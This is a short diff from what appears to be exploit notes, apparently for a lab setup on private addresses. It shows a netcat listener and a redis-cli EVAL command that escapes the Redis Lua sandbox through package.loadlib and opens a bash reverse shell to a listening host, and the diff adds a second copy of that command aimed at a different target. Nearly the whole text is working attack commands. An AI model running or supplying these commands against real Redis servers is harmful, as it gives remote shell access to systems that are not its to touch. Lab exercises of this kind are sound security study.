@@ -11,3 +11,5 @@ nc -nvlp 4444
 
 # To open that reverse shell
 redis-cli -h 192.168.56.113 EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = f(); os.execute("bash -c \"bash -i >& /dev/tcp/192.168.56.114/4444 0>&1\"");' 0
+
+redis-cli -h 192.168.56.100 EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = f(); os.execute("bash -c \"bash -i >& /dev/tcp/192.168.56.101/4444 0>&1\"");' 0 
